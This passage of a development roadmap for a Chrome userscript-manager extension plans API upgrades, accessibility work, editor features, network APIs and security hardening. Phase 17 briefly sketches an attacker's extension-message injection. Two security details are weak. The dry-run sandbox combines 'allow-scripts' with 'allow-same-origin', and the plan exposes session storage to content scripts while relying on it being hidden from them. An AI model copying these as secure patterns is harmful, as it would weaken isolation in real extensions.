Source: [Monaco Editor CHANGELOG](https://github.com/microsoft/monaco-editor/blob/main/CHANGELOG.md).

Steps:
1. Run `npm install monaco-editor@0.55.x`
2. Verify esbuild bundle still produces working editor
3. Update any `languages.*` namespace references
4. Test all 8 themes and editor keyboard shortcuts

### 13.5 Acorn Upgrade: 8.12 → 8.16

The AST parser used for security analysis. New in 8.14-8.16:
- **ES2025 import attributes** (`with { type: "json" }`)
- **ES2025 RegExp modifiers** (`/foo(?i:bar)/`)
- **`using` / `await using`** explicit resource management (8.15)
- **CommonJS source type** (8.16) — useful for analyzing `require()`-style @require dependencies

Source: [Acorn CHANGELOG](https://github.com/acornjs/acorn/blob/master/acorn/CHANGELOG.md).

Steps: `npm install acorn@latest`; verify AST-based security detector still passes all test cases.

### 13.6 CI: Adapt to `--load-extension` Removal (Chrome 137)

Chrome 137 removes the `--load-extension` CLI flag. Puppeteer has contributed fixes upstream for loading extensions without this flag. Source: [Chrome Extensions June 2025 news](https://developer.chrome.com/blog/extension-news-june-2025).

- Update `npm run smoke:dashboard` to use Puppeteer's new extension-loading API
- Verify CI pipeline still provisions Chrome and loads the unpacked extension
- Test locally: `npx puppeteer browsers install chrome@stable` then run smoke test

### 13.7 Git Repository Sync

VM issue [#2176](https://github.com/violentmonkey/violentmonkey/issues/2176). Allow backing up/restoring scripts to a GitHub/GitLab/Bitbucket repository:

- New sync provider: `GitSync` — uses the GitHub Contents API (or GitLab equivalent) to commit script files to a repo
- Each script = one `.user.js` file in the repo; metadata stored in a `manifest.json` at the repo root
- Commit messages auto-generated: `"Update <ScriptName> to v<version>"` 
- Pull: fetch all `.user.js` files from repo, install/update scripts matching namespace
- Two-way: local changes push upstream; remote changes pull down on sync
- Auth: GitHub personal access token, stored in `chrome.storage.local`
- This slots into Phase 8's sync provider architecture; add `GitHubSyncProvider` implementing the `SyncProvider` interface

### 13.8 Publish to GreasyFork/OpenUserJS

VM issue [#2425](https://github.com/violentmonkey/violentmonkey/issues/2425). One-click publish from the editor:

- Add "Publish…" button in the Monaco editor toolbar
- Dialog: pick target (GreasyFork / OpenUserJS), enter session cookie or API token
- GreasyFork: use the prefill URL API (`/en/script_versions/prefill` POST) to open the submission form pre-populated with the current code
- OpenUserJS: equivalent API endpoint
- Notify via toast when the browser tab opens with the prefill form
- Note: does not require ScriptVault to handle auth; the user's existing browser session is used for GreasyFork's cookie-based submission

### 13.9 `chrome.permissions.addHostAccessRequest()` (Chrome 132)

Chrome 132 added `chrome.permissions.addHostAccessRequest()` to proactively surface host permission requests in the Extensions menu (the puzzle-piece icon) without requiring an immediate dialog. This is especially important for ScriptVault since scripts routinely need permissions for sites not anticipated at install time.

- Call `addHostAccessRequest({tabId, documentId, url})` when a script encounters a permission denial on the current tab
- The Extensions menu will show a "ScriptVault wants access to this site" badge that the user can click to grant
- Gracefully degrades on Chrome < 132 (condition already needed for runtime permission diagnostics in Phase 12.12)

Source: [Chrome Extensions What's New — Chrome 132](https://developer.chrome.com/docs/extensions/whats-new).

### 13.10 CWS Verified CRX Signing (June 2025)

The Chrome Web Store now supports developer-registered signing keys: once a public key is registered in the developer dashboard, all future CRX uploads must be signed with the corresponding private key. An account-takeover attack can no longer push an unsigned update.

- Generate a dedicated signing keypair for ScriptVault (separate from the `.pem` used for local testing)
- Register the public key in the CWS developer dashboard
- Integrate signing into the release workflow (`.github/workflows/release.yml`)
- Store the private key as a GitHub Actions secret (`CWS_SIGNING_KEY`)

Source: [Chrome extension news — June 2025](https://developer.chrome.com/blog/extension-news-june-2025).

### 13.11 `chrome.storage.session` Optimization (Chrome 130)

Chrome 130 added `StorageArea.getKeys()` across all storage areas, reducing overhead for frequent "list what's in storage" operations in the service worker. The session storage area (10 MB quota, in-memory, cleared on restart) is ideal for per-tab volatile state like currently-executing script IDs and per-tab injection results.

- Migrate volatile runtime state (currently stored in in-memory JS objects that die with the SW) into `chrome.storage.session`
- Use `getKeys()` in hotpaths where a full `get()` is unnecessary
- Set `setAccessLevel({accessLevel: 'TRUSTED_AND_UNTRUSTED_CONTEXTS'})` if content scripts need to read session state

Source: [chrome.storage API reference](https://developer.chrome.com/docs/extensions/reference/api/storage).

**Exit criteria:** Structured clone opt-in on Chrome 148; panel layout aware; onboarding docs reflect Chrome 138 toggle; Monaco 0.55.x with AMD migration verified; Acorn 8.16; smoke tests pass without `--load-extension`; git sync provider works end-to-end; GreasyFork prefill flow works; `addHostAccessRequest()` used for permission denials on Chrome 132+; CWS signing key registered and wired into release workflow; volatile SW state migrated to `storage.session`.

---

## Phase 14 — Accessibility & Internationalization

**Goal:** Meet WCAG 2.2 AA compliance for ScriptVault's own UI and broaden locale support.

These items address structural accessibility debt and do not affect script execution. They are independently shippable.

### 14.1 Font Sizes: px → rem

All font sizes are currently in `px`, which ignores user browser font-size preferences (see `CLAUDE.md` Known Remaining Issues).

- Audit every CSS file: `grep -n 'font-size:.*px' **/*.{css,html,js}`
- Replace all `px` values with `rem` equivalents (base 16px assumed)
- Test: set Chrome's base font to 20px and verify dashboard text scales correctly
- Also convert `line-height` and spacing tied to font size

### 14.2 WCAG 2.2 Focus Visibility (2.4.11 AA)

WCAG 2.2 criterion 2.4.11 (published October 2023) requires that when a component receives keyboard focus, it is not entirely hidden by author-created content. Source: [W3C WCAG 2.2 new criteria](https://www.w3.org/WAI/standards-guidelines/wcag/new-in-22/).

- Audit sticky/fixed elements (sidepanel toolbar, dashboard header, toast stack) to verify they do not obscure focused elements
- Add `scroll-margin-top` / `scroll-padding-top` to ensure focused rows scroll into view above sticky headers

### 14.3 WCAG 2.2 Target Sizes (2.5.8 AA)

Criterion 2.5.8 requires touch targets to be at least 24×24 CSS pixels (with spacing accounting for smaller sizes). Source: [W3C WCAG 2.2](https://www.w3.org/WAI/standards-guidelines/wcag/new-in-22/).

- Audit all interactive controls: script enable/disable toggles, action buttons, checkboxes, dropdown items
- Apply `min-height: 24px; min-width: 24px` or ensure adequate spacing via `padding` around smaller controls
- Note: most dashboard controls are already ≥ 32px; this primarily affects the popup's compact list

### 14.4 Screen Reader Support for Script Toggles

TM issue [#2676](https://github.com/Tampermonkey/tampermonkey/issues/2676). The script enable/disable toggle is not announced correctly by screen readers.

- Ensure toggle elements use `<button role="switch" aria-checked="true|false">` pattern
- Add `aria-label` with script name: `aria-label="Enable {scriptName}"`
- Announce state change via `aria-live="polite"` region (or `role="status"`)
- Test with NVDA (Chrome) and VoiceOver (macOS)

### 14.5 Drag-Sort Keyboard Alternative

WCAG 2.5.7 (AA) requires that any drag movement have a single-pointer alternative. The script list drag-sort and folder reordering have no keyboard fallback. Source: [W3C WCAG 2.2 dragging movements](https://www.w3.org/WAI/standards-guidelines/wcag/new-in-22/).

- When a drag-handle is focused (keyboard Tab), pressing Enter enters "move mode"
- Arrow keys move the item up/down in the list
- Enter confirms placement; Escape cancels
- Visual indicator shows which item is being moved and its target position

### 14.6 RTL Layout Support

Groundwork for right-to-left locales (Arabic, Hebrew, Farsi). Uses the `sidePanel.getLayout()` API from Phase 13.2.

- Switch all directional CSS from `left`/`right` to `inset-inline-start`/`inset-inline-end`
- Test by setting `<html dir="rtl">` and verifying layout does not break
- `chrome.sidePanel.getLayout()` result feeds `data-panel-side` attribute on `<body>` for per-side styling

### 14.7 i18n: `_messages.json` Coverage Audit

The extension's `_locales/` directory has en-US strings but coverage is incomplete (many UI strings are hardcoded in JS/HTML).

- Enumerate all user-visible strings via `grep -rn "textContent\|innerHTML\|innerText\|placeholder\|title\|aria-label" pages/ dashboard-*.js`
- Move all found strings to `_messages.json` entries
- Add `getMessage()` calls in JS; `data-i18n` attributes in HTML with a lightweight init-time substitution pass
- Start with en-US only; structure enables future community translations
- Add a CI lint step: strings not in `_messages.json` are a build warning

**Exit criteria:** All font sizes in rem; WCAG 2.2 focus and target criteria pass; toggle announced correctly by screen reader; drag-sort has keyboard alternative; RTL layout does not break; all visible strings in `_messages.json`.

---

## Phase 15 — Editor & Developer Experience

**Goal:** Close the gap between ScriptVault's built-in editor and a full development environment. Bring first-class TypeScript authoring, live grant detection, version history, and diffing into the editor itself.

### 15.1 GM_* IntelliSense via `@types/tampermonkey`
- After Phase 13.4 (Monaco 0.55.x), call `monaco.typescript.typescriptDefaults.addExtraLib(src, 'ts:tm.d.ts')`
- Bundle `@types/tampermonkey` (45KB) at build time; inject on editor initialization
- Also inject `@types/greasemonkey` for GM4 Promise-style APIs
- After injection: full autocomplete, parameter hints, type errors for all 35+ GM_* functions
- Source: `github.com/DefinitelyTyped/DefinitelyTyped/blob/master/types/tampermonkey/index.d.ts` [source 47]

### 15.2 Auto-Grant Inference (Live AST)
- As the user types in the Monaco editor, run a Web Worker Acorn parse on the current document text
- Walk `Identifier` and `MemberExpression` nodes matching against a list of 28+ `grantNames` (pattern from `vite-plugin-monkey/src/node/utils/grant.ts`) [source 49]
- Display a non-intrusive suggestion bar: "Detected: GM_xmlhttpRequest, GM_setValue — add to @grant?" with one-click accept
- Diff the detected set against existing `@grant` lines and only suggest additions
- ScriptVault has Acorn already in `background.js`; the Web Worker path reuses it without shipping a second copy
- vite-plugin-monkey does this at build time; ScriptVault is the first manager to do it live in the editor [source 50]

### 15.3 Script Version History & Rollback
- On every save (Ctrl+S or auto-save), compute a `diff-match-patch` delta from the previous version and store as `{scriptId, timestamp, @version, type:'patch', data:patchText, source:'manual_edit'}` in IndexedDB `script_versions` store [source 72]
- Store a full copy as the anchor for each 10-version window; all others are deltas (typical bug-fix patch ≈ 200–500 bytes vs. 8KB full copy → ~95% space saving)
- UI: "History" tab per script showing version timeline (timestamp, @version, delta size)
- One-click rollback to any snapshot; exports any historical version as `.user.js`
- Retention policy: last 20 versions or 90 days (configurable in settings)
- Requires Phase 2 (IndexedDB) for the `script_versions` store
- No manager has this; VM #1391 (data loss with no recovery) illustrates the gap [source 60]

### 15.4 Diff View on Update
- Before applying an @updateURL pull, open a `monaco.editor.createDiffEditor()` side-by-side view showing current vs. incoming script body
- "Update" button stays disabled until the user reviews the diff; "Update" and "Skip" are the only actions
- On apply, snapshot current version (source: `'update_check'`) into script_versions before overwriting
- Addresses VM's #1 most-reacted enhancement request (VM #500, 80+ upvotes) [source 73]
- Also addresses VM #1023: decouples "check for update" from "auto-install" [source 74]
- Scripts with local edits (body differs from installed @version hash) get an additional warning: "Your local edits will be overwritten"

### 15.5 Script Templates & Scaffolding
- Add 6 built-in templates to the New Script dialog: Basic, DOM Manipulation, AJAX Interceptor, CSS Injection, MutationObserver SPA, TypeScript Starter
- Template variables: `$DATETIME$`, `$URL_PATTERN$`, `$SCRIPT_NAME$`, `$VERSION$`
- ScriptFlow (the reference open-source userscript IDE) has 5 templates; this matches and adds MutationObserver/TypeScript variants [source 51]
- TamperMonkey supports `$DATETIME$` in new-script templates [source 52]; ScriptVault extends the pattern

### 15.6 In-Browser TypeScript Transpilation (esbuild-wasm)
- Add `esbuild-wasm` to devDependencies; bundle the 3.2MB `.wasm` file into `lib/esbuild/`
- Manifest CSP update: add `'wasm-unsafe-eval'` to `content_security_policy.extension_pages` (Chrome 112+ required, already above minimum_chrome_version 120) [source 48]
- Worker initialization: `await esbuild.initialize({ wasmURL: './lib/esbuild/esbuild.wasm' })`
- Compile-on-save: transform TypeScript → JavaScript before injecting; store both source (for editing) and compiled output (for injection) in IndexedDB
- Editor indicator: "TypeScript mode" badge in the editor footer when @userscript header lacks `// @nocompile`
- No other userscript manager or open-source userscript IDE implements in-browser TypeScript transpilation [source 48]

### 15.7 Live Reload (Re-Inject to Active Tab)
- Add a "▶ Run in Active Tab" button to the editor toolbar
- On click: call `chrome.scripting.executeScript({ target: { tabId }, func: injectScript, world: 'MAIN' })` to re-execute the current editor content in the active tab
- Display a toast: "Re-injected to Tab #N — (tab title)"
- Caveat: `executeScript` cannot undo previous execution effects (DOM mutations persist); warn user on first use
- Uses `chrome.userScripts.execute()` (Chrome 135+) for scripts requiring USER_SCRIPT world [source 13]
- vite-plugin-monkey provides HMR via an external dev server (requires Vite running locally); ScriptVault provides it natively within the extension [source 50]

### 15.8 Dry-Run Sandbox
- Add "Sandbox" mode: open a sandboxed `<iframe sandbox="allow-scripts allow-same-origin">` in the editor panel
- Inject a GM_* mock layer into the iframe that intercepts all GM_* calls, logs them to the console panel with arguments, and optionally simulates return values
- Mock coverage: GM_setValue/getValue/listValues (in-memory Map), GM_xmlhttpRequest (returns configurable mock response), GM_notification (logs), GM_addStyle (injects into iframe)
- Run the script against the sandbox by clicking "▶ Sandbox"
- ScriptFlow implements a DOM-only PiP preview; ScriptVault's sandbox adds GM_* interception — no manager has this [source 51]

**Exit criteria:** GM_* types appear in Monaco autocomplete; auto-grant inference detects all 28 grantNames from vite-plugin-monkey's list; version history stores and retrieves diffs; diff view renders before every @updateURL update is applied; 6 templates exist in new-script dialog; esbuild-wasm compiles TypeScript on save; live reload injects to active tab; sandbox intercepts GM_setValue calls.

---

## Phase 16 — Advanced XHR & Network Modernization

**Goal:** Close the XHR API gap vs. TamperMonkey and leapfrog VM. Add Promise-based `GM_fetch`, AbortController support, proper streaming, CHIPS/cookie partition parity, and OpenUserJS as a second script source.

### 16.1 `GM_fetch` (Promise-Based Fetch API)
- Implement `GM_fetch(url, init?)` as a new GM function returning `Promise<Response>`
- Background SW uses `fetch()` with the extension's host permissions to bypass CORS; passes cookies and headers as specified in `init`
- Response is serialized over `chrome.runtime.connect` to the content-world caller; `response.body` is a `ReadableStream` piped through the port
- FireMonkey (Firefox) is the only existing manager with a `GM_fetch` implementation; TM/VM don't have it [source 55]; TM #1050 was proposed and closed without implementation [source 56]
- Add `GM_fetch` to `@types/tampermonkey`-aligned type definitions: `GM_fetch(url: string | URL, init?: RequestInit): Promise<Response>`

### 16.2 AbortController Signal Support in `GM_xmlhttpRequest`
- Accept `signal?: AbortSignal` as a new field in the `GM_xmlhttpRequest` request object
- Bridge: `signal.addEventListener('abort', () => nativeReq.abort())`; propagate `signal.reason` to the `onabort` callback as the abort reason
- No manager (TM, VM, ScriptCat) supports this; all use a separate `.abort()` control object [source 58]
- Enables cancellation sharing: one AbortController can cancel multiple GM requests + native fetch calls simultaneously

### 16.3 Proper XHR Streaming (ReadableStream without Caveats)
- TamperMonkey's `responseType: 'stream'` forces `fetch: true` mode, sacrificing `abort`, `timeout`, and `onprogress` [source 59]; ScriptCat's stream support is "rudimentary" by their own docs [source 1]
- ScriptVault implementation: use `fetch()` with `response.body.getReader()` in the SW background; pipe chunks through a `chrome.runtime.connect` long-lived port to the content world; emit synthetic `onprogress` events from chunk sizes
- Preserves abort (signal the port close), timeout (alarm in SW), and progress simultaneously
- Leapfrog over all current implementations [source 59]

### 16.4 CHIPS / Cookie Partition Support
- Add `cookiePartition?: { topLevelSite?: string }` to the `GM_xmlhttpRequest` request type, matching `@types/tampermonkey:83-86` [source 47]
- Background SW passes `cookiePartition` as the `partitionKey` in the `chrome.cookies.get*` calls used by the GM_cookie implementation (Phase 11.6)
- Fixes the active user pain point documented in VM #2100: Cloudflare-protected sites set partitioned cookies; without partition key forwarding, XHR from the SW context uses the wrong partition and gets 403 errors [source 63]
- TamperMonkey has `cookiePartition` in types; VM does not — this is parity with TM and leapfrog over VM

### 16.5 XHR Redirect Mode
- Add `redirect?: 'follow' | 'error' | 'manual'` to `GM_xmlhttpRequest` request, matching `@types/tampermonkey:79`
- `'manual'` mode: return the 3xx response before following; expose `Location` header to the script
- VM issue #2359 (redirect control) has been open since 2023 — TM already has this [source 27]
- Low-effort addition: pass `redirect` directly to the `fetch()` call in the SW background handler

### 16.6 `GM_download` Improvements
- Accept `url: string | Blob | File` (not just string) — matches TM v5.4.6226+ behavior; enables in-memory downloads (canvas export, constructed data) [source 58]
- Add `conflictAction: 'uniquify' | 'overwrite' | 'prompt'` parameter for download naming conflicts
- Stretch: chunked `Range: bytes=X-Y` resume support — issue background `Range` requests; reassemble in SW; resume interrupted downloads. No manager has this [source 58]

### 16.7 OpenUserJS in Script Browser
- Add OpenUserJS as a second source tab alongside GreasyFork in the Phase 12.16 script browser
- Install URL format `https://openuserjs.org/install/{user}/{name}.user.js` — the `.user.js` interception already handles installs; no new code needed for the install flow [source 67]
- Search: OUJS has no documented JSON API; implement as an HTML scrape of `/scripts?q={query}` or a static "browse top scripts" list if search isn't feasible
- Show source badge in script details: "GreasyFork" | "OpenUserJS" | "Direct URL"

**Exit criteria:** `GM_fetch` resolves with a real `Response` object; `signal` aborts both a native fetch and a GM_xmlhttpRequest in the same chain; streaming response emits `onprogress` and can be aborted; `cookiePartition` is passed to the background fetch; `redirect: 'manual'` returns the 3xx response; `GM_download` accepts a `Blob` url; OpenUserJS scripts appear in the browser and install on click.

---

## Phase 17 — Security & Integrity Round 2

**Goal:** Harden the injection pipeline and audit trail. Close the script body integrity gap, decouple update-check from auto-install, and guard against external message injection.

### 17.1 Script Body Integrity Hash at Injection Time
- On every save, compute `await crypto.subtle.digest('SHA-256', encoder.encode(scriptBody))` and store the hex hash in `chrome.storage.session` (cleared on browser restart, inaccessible to content scripts)
- At injection time (before `userScripts.register()` / `userScripts.execute()`), recompute the hash of the stored body and compare
- If mismatch → abort injection, show a dashboard alert: "Script '{name}' body has changed unexpectedly — possible tampering detected"
- Threat model: another extension with `storage` access mutates `chrome.storage.local`; a compromised SW writes bad content before injection [source 69]
- Phase 11.8 covers `@require` SRI; this closes the remaining gap on the script body itself

### 17.2 Tamper-Evident Audit Log
- Maintain a rotating log in `chrome.storage.local`: `{scriptId, scriptName, timestamp, changeHash, changeType: 'install'|'update'|'edit'|'delete'|'enable'|'disable'}`
- `changeHash`: SHA-256 of (scriptId + timestamp + changeType + scriptBodyHash) — makes the log entry tamper-detectable
- Cap at 100 events (FIFO); display in a "Audit Log" or "History" tab in the dashboard
- No competitor (TM, VM, ScriptCat) offers a tamper-evident audit trail [source 70]

### 17.3 Update Consent Decoupling — Now-priority-1 (TM shipped May 8, 2026)
- "Check for updates" (query `@updateURL`) must never silently install the new version
- Current flow: check → if newer version available → auto-install
- New flow: check → store pending update → badge the script row "⬆ Update available" → user clicks → diff view (Phase 15.4) → user confirms → install
- Exception: if user has explicitly set auto-update AND script body is unmodified since last install → auto-install is permitted (matches TM's "no local edits" guard)
- VM #1023 documents this as the #2 most-painful VM behavior (check triggers install, destroying local edits) [source 74]
- **2026-05-17 status (Round 12):** Tampermonkey **5.5.0 (May 8, 2026)** rolled this to stable per [tampermonkey.net/changelog.php](https://www.tampermonkey.net/changelog.php). The most-painful documented behavior in the manager ecosystem is now solvable by switching managers — urgency raises to Now-priority-1 within Phase 17 ordering. Phase 38.3 (Round 11 promotion) and Phase 38.9 (VM v2.37.1 force-update guard) are both subsumed here; implement once as a tri-state Settings → Updates control ("Check only" / "Check + install" / "Manual review per script").

### 17.4 External Message Origin Validation
- Audit every `chrome.runtime.onMessage` and `chrome.runtime.onMessageExternal` handler in the SW
- Add an explicit `sender.id` allowlist check for any `onMessageExternal` handler; reject messages from unknown extension IDs
- If `externally_connectable` is added to manifest (Phase 12.14 vscode.dev), the allowlist must enumerate `Tampermonkey/tampermonkey-editors`'s extension ID
- Threat: a malicious extension can call `chrome.runtime.sendMessage(ScriptVaultExtensionID, { action: 'installScript', ... })` if the message handler doesn't validate origin [source 71]

### 17.5 chrome:// URL @match Warning
- When a script's `@match` or `@include` contains `chrome://`, `chrome-extension://`, or `edge://` patterns, show an inline editor warning: "chrome:// URLs cannot be matched by userscripts — this pattern will never execute"
- These URLs are blocked by the Chrome APIs regardless of declared permissions; the error is silent and confusing for users
- Addresses top Stack Overflow pain point: "Script not executing on chrome:// pages" (5K views, Oct 2025) [source 75]

### 17.6 `@require-css` Metadata Directive
- Parse `@require-css` lines in the metadata block (ScriptCat innovation) [source 4]
- Fetch and cache the CSS resource at install time (same pipeline as `@require`)
- At injection time, inject a `<style>` into `document.documentElement` before any script runs (FOUC-safe)
- Cleaner than runtime `GM_addStyle` calls for static CSS assets; eliminates a common `@require` + `GM_addStyle` pattern
- `@require-css` resources are subject to the same SRI verification as `@require` (Phase 11.8)

### 17.7 `GM_addStyle` Handle-Based API
- `GM_addStyle(css)` currently returns `HTMLStyleElement` — add new optional second parameter: `GM_addStyle(css, { target?: Element | ShadowRoot })` for ShadowRoot injection
- Return a handle object: `{ element: HTMLStyleElement, remove(): void, replace(newCss: string): void }`
- `remove()`: cleanly removes the injected `<style>` element
- `replace()`: atomically swaps CSS content without DOM flicker
- TM marked GM_removeStyle/replace as "not planned" (TM #2671 closed) — leapfrog opportunity [source 80]
- ShadowRoot injection enables styling Web Components without `::part()` access hacks; no manager currently supports this [source 80]
- FOUC fix: if `@run-at document-start`, inject into `document.documentElement` directly; move to `<head>` via `MutationObserver` once it exists

**Exit criteria:** Injection is aborted when script body hash mismatches stored reference; audit log entries appear in dashboard after install/update/edit/delete; update check never auto-installs without user confirmation; no `onMessageExternal` handler accepts messages from unlisted extension IDs; chrome:// @match patterns show inline warning in editor; @require-css CSS is injected before script runs; GM_addStyle handle's `.remove()` cleanly removes the style element; ShadowRoot injection works on a test page with a Web Component.

---

## Phase 18 — Performance & Storage Modernization

**Goal:** Reduce SW cold-start time, replace heavyweight dependencies where native APIs suffice, handle large script libraries gracefully, and expose new platform capabilities to userscripts.

### 18.1 ES Module Splitting for SW Cold-Start
- Change manifest: `"background": { "service_worker": "background.js", "type": "module" }`
- Restructure esbuild config to emit multiple chunks via `--splitting` flag; entry point stays `background.js` but imports are dynamically loaded
- Lazy initialization pattern: SW entry point wires only event listeners; heavy subsystems (GM API shim, sync engine, storage engine) are `import()`-ed inside their first event handler
- Practical split: `core.js` (event routing, ~2K lines) + `gm-api.js` (GM_* implementations, ~4K lines) + `sync.js` (sync providers, ~2K lines) + `dashboard-bridge.js` (dashboard message handlers)
- SW cold-start time target: <300ms for 80% of users (from ~1200ms baseline with 16K-line monolith) [source 76]
- Requires: Phase 1 TypeScript migration complete so the module graph is clean

### 18.2 OPFS for Large Script Storage
- `navigator.storage.getDirectory()` works from the extension's origin in MV3 [source 77]
- For scripts > 50KB (large userscripts, TypeScript source from Phase 15.6), store the content in OPFS as a `FileSystemFileHandle`; store only the UUID path reference in IndexedDB
- Use `FileSystemSyncAccessHandle` in an offscreen document worker for zero-copy synchronous reads at injection time
- Caveat: OPFS is cleared on "clear all browsing data"; always maintain IndexedDB as the canonical record
- Requires Phase 2 (IndexedDB) as the metadata layer; OPFS supplements it for large payloads [source 77]

### 18.3 `scheduler.postTask` for Background Tasks
- Replace bare `setTimeout(fn, 0)` patterns in the SW with `scheduler.postTask(fn, { priority: 'background' })` (Chrome 94+)
- Apply to: hash verification (Phase 17.1), backup compression, sync polling, @require cache refreshes
- Replace busy loops / Promise-chaining with `await scheduler.yield()` (Chrome 124+) in multi-step SW operations to prevent starving the event loop [source 78]
- Zero API surface change; purely internal optimization

### 18.4 CompressionStream for Backup Export
- Replace the fflate-based export path with native `CompressionStream('gzip')` for streaming backup generation (Chrome 80+, no dependency needed) [source 79]
- Keep fflate in the codebase for: synchronous compression cases, zstd/brotli format support, and any non-streaming paths
- Reduces the fflate dependency footprint in the streaming export path; exports start streaming bytes immediately instead of buffering the full backup in memory

### 18.5 Virtual Scrolling for Script Lists
- At script count ≥ 100, activate virtual scrolling in the sidePanel and dashboard script list
- Use `@tanstack/virtual-core` (3KB minified, zero framework dependencies) for variable-height row virtualization [source 79]
- Below 100 scripts: current flat render is fine; add a threshold check on list render
- Ensures smooth scrolling for power users with 200+ scripts

### 18.6 SharedWorker extendedLifetime (Chrome 148)
- Chrome 148 ships `SharedWorker` with `extendedLifetime: true` — the worker survives after all connected tabs close [source 26]
- Move long-running backup generation and sync operations into a `SharedWorker` with `extendedLifetime: true`; this eliminates the need for chrome.alarms heartbeats in those specific flows
- SW still handles all Chrome API calls (SharedWorker cannot call `chrome.*` APIs directly); bridge: SW spawns worker, worker does heavy computation, posts result back to SW
- Version guard: check `typeof SharedWorker !== 'undefined'` and check worker feature detection before using; fall back to alarm-based approach on earlier Chrome versions

### 18.7 Sanitizer API: GM_setHTML + Extension UI
- Chrome 146 ships `Element.setHTML(html, { sanitizer: new Sanitizer(...) })` as the native XSS-safe innerHTML [source 29]
- Add `GM_setHTML(element, html, sanitizerConfig?)` as a new GM function: wraps `element.setHTML()` so scripts can safely inject HTML without constructing a `DOMParser + manual sanitization` chain
- In extension UI code (dashboard, popup, settings): replace `element.innerHTML = str` patterns with `element.setHTML(str)` or `Document.parseHTML(str)` — eliminates the DOMPurify dependency from extension UI code paths where Chrome 146+ is guaranteed
- For compatibility with Chrome 120–145: keep DOMPurify as a fallback; feature-detect with `typeof Element.prototype.setHTML !== 'undefined'`

### 18.8 `navigator.storage.persist()` Before IndexedDB Open
- Greasemonkey 4.x is the only manager that calls `await navigator.storage.persist()` before opening its IndexedDB database [source 68]; no other manager does this
- Chrome can evict `chrome.storage.local` and IndexedDB data under storage pressure if `persist()` hasn't been called
- Add `await navigator.storage.persist()` to the Phase 2 IndexedDB initialization sequence; log the result (`true` = granted, `false` = denied due to storage policy)
- Show a one-time warning in the dashboard if `persist()` returns `false`: "Storage persistence not granted — scripts may be lost if browser storage is cleared under pressure"

### 18.9 Broken Script Detector
- Track last-matched timestamp per script: on each `userScripts` injection success, update `{scriptId: lastMatchedAt}` in `chrome.storage.session`
- At dashboard open, surface scripts where `lastMatchedAt` is null (never ran) or `> 30 days ago` with a yellow ⚠ badge
- "Script hasn't matched any page in 30+ days — check your @match patterns" — with a direct link to the URL Patterns editor
- Addresses Stack Overflow pattern: "scripts breaking after browser updates" is frequently caused by stale `@match` patterns that nobody notices [source 75]
- Auto-suppressed for intentionally domain-specific scripts (user can dismiss the warning per-script)

### 18.10 `@require-nocache` Development Directive
- Add `@require-nocache` as a metadata directive that bypasses the `@require` resource cache for named URLs
- During development, scripts often reference `@require` URLs pointing to localhost or a staging server; the cache means changes don't appear until the cache expires
- Pattern: `// @require-nocache  http://localhost:3000/myscript.js` — fetches fresh on every page load
- TM #723 documents this as an active developer pain point [source 76]
- Implementation: skip the IndexedDB resource cache for URLs listed in `@require-nocache`; always fetch

**Exit criteria:** SW cold-start measured with `performance.now()` before and after module splitting; OPFS handles scripts > 50KB without IndexedDB size errors; `scheduler.postTask` replaces all `setTimeout(fn, 0)` in SW; backup export streams bytes without OOM on a library with 200 scripts; virtual scrolling activates at 100 scripts; SharedWorker backup runs on Chrome 148 without SW alarms; `GM_setHTML` injects sanitized HTML; dashboard shows "storage not persistent" warning when `navigator.storage.persist()` returns false; broken script badge appears for scripts with 30+ day gap in @match hits; `@require-nocache` bypasses cache.

---

## Phase 19 — Multi-Store Distribution & CWS Compliance

**Goal:** Expand ScriptVault beyond Chrome Web Store to Edge Add-ons, Firefox AMO, and self-hosted update channels.

### 19.1 Edge Add-ons Store Listing
- Microsoft Edge Add-ons has a different submission/review process than CWS
- Manifest v3 support confirmed; no manifest changes required beyond CWS
- Create `edge-addon-submission.md` documenting store-specific screenshots, category tags (Developer Tools), and testing on Edge Canary
- Zero code changes; purely store operations [source 97]

### 19.2 Firefox AMO Listing (MV2 Compatibility Note)
- Firefox uses MV2 extension model; a ScriptVault Firefox port would require complete architectural changes (service worker → background page, `browser.runtime` vs `chrome.runtime`)
- Document this explicitly in `FIREFOX-PORT.md` — do not include in the MV3 roadmap
- Note: Violentmonkey and Tampermonkey have separate FF codebases, not shared source

### 19.3 Self-Hosted CRX Update Server
- Create an optional update manifest server for users who want to host ScriptVault CRX artifacts themselves
- Implement `autoupdate.xml` generator: reads released CRX file, computes SHA256 hash, outputs XML with `<updatecheck>` tags [source 98]
- Example: `GET https://example.com/scriptvault/updates.xml` returns Chrome's autoupdate XML format
- Documentation: how to set `update_url` in manifest for self-hosted updates

### 19.4 TM/VM ZIP Import Round-Trip Compatibility
- Tampermonkey backup JSON structure: per-script `uuid`, `config`, `script` (code), `meta` (headers)
- Violentmonkey ZIP structure: `scripts/` folder with one `.user.js` per script, `_meta.json` for metadata
- Implement bidirectional conversion: ScriptVault ZIP can import from both TM backup JSON and VM ZIP
- Round-trip: export as both TM-compatible JSON and VM-compatible ZIP in the Settings export options [source 99]

### 19.5 Developer Tooling Ecosystem Documentation
- Create `DEVELOPER_GUIDE.md`: patterns for bundling userscripts with esbuild/Vite + ScriptVault metadata
- Document how to use `@types/tampermonkey` for full IDE IntelliSense (Phase 15.1)
- Link to `vite-plugin-monkey` and alternatives
- No new code; curate best practices and link to existing tools

### 19.6 CWS Policy Compliance & Remote Code Execution Exception
- ScriptVault, like TM and VM, falls under the "trusted remote code execution" exception in CWS policies [source 100]
- Document the policy exception in `COMPLIANCE.md` to clarify that executing arbitrary user-provided scripts is intentional and allowed
- Prepare for CWS audit response: cite policy exception and document user consent model

**Exit criteria:** Edge Add-ons submission created and approved (if possible in test env); `autoupdate.xml` generator works for self-hosted CRX; bidirectional TM/VM import tested; `DEVELOPER_GUIDE.md` published with tooling patterns; CWS compliance memo drafted.

---

## Phase 20 — Script Execution Observability & Debugging

**Goal:** Help users and developers debug failing or slow userscripts with local, privacy-safe tools.

### 20.1 Per-Script Execution Time Logging
- Wrap `GM_xmlhttpRequest` and `GM_fetch` with `performance.mark()` / `performance.measure()` to track network latency per script
- Store timing data in IndexedDB under `script_stats` table (extends Phase 2 schema)
- Dashboard: "Performance" tab shows per-script median execution time, outliers flagged [source 101]

### 20.2 Source Map Support for Error Stack Traces
- When ScriptVault injects a userscript, append a `//# sourceMappingURL=data:...` comment with an inline source map if available
- For scripts with `@require`, embed source maps for dependencies in the injection bundle
- Error stack traces in console will then point to original source files, not injected code [source 102]
- Requires Phase 15.6 (esbuild-wasm TS transpilation) to generate source maps in editor

### 20.3 Per-Script Console Interception
